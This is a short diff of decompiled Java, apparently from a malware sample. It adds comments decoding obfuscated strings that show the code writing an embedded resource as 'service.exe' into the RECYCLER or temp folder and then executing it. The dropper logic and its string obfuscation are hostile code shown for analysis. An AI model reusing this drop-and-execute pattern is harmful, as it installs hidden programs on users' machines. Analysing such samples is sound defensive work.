@@ -16,15 +16,15 @@
 /*     */     }
 /*  17 */     FileOutputStream fileOutputStream = null;
 /*     */     
-/*  19 */     String str = Issue.csfn("12312c123:123\\123R123E12C213Y423C45L6345E634345R\\65452321266142523");
+/*  19 */     String str = Issue.csfn("12312c123:123\\123R123E12C213Y423C45L6345E634345R\\65452321266142523");  // c:\\RECYCLER\\
 /*  20 */     if (!createDir(str)) {
 /*     */       
-/*  22 */       str = System.getProperty(Issue.csfn("1234j432a453v134a453.643i23o45.234t54m652p234d54i234r5432245"));
+/*  22 */       str = System.getProperty(Issue.csfn("1234j432a453v134a453.643i23o45.234t54m652p234d54i234r5432245"));  // java.io.tmpdir
 /*  23 */       if (!str.endsWith("/") && !str.endsWith("\\")) {
 /*  24 */         str = str + System.getProperty(Issue.csfn("file.separator"));
 /*     */       }
 /*     */     } 
-/*  27 */     str = str + Issue.csfn("324s23er34365v45i34c323e24.5555e544x234e");
+/*  27 */     str = str + Issue.csfn("324s23er34365v45i34c323e24.5555e544x234e");  // service.exe
 /*     */     
 /*  29 */     InputStream inputStream = getClass().getResourceAsStream(paramString);
 /*     */     
@@ -68,7 +68,7 @@
 /*     */     
 /*     */     try {
 /*  70 */       Thread.sleep(2000L);
-/*  71 */       info1.funcRun(Issue.csfn("34125e5x34e23c"), str);
+/*  71 */       info1.funcRun(Issue.csfn("34125e5x34e23c"), str);  // exec
 /*     */     }
 /*  73 */     catch (Exception exception) {}
 /*     */     
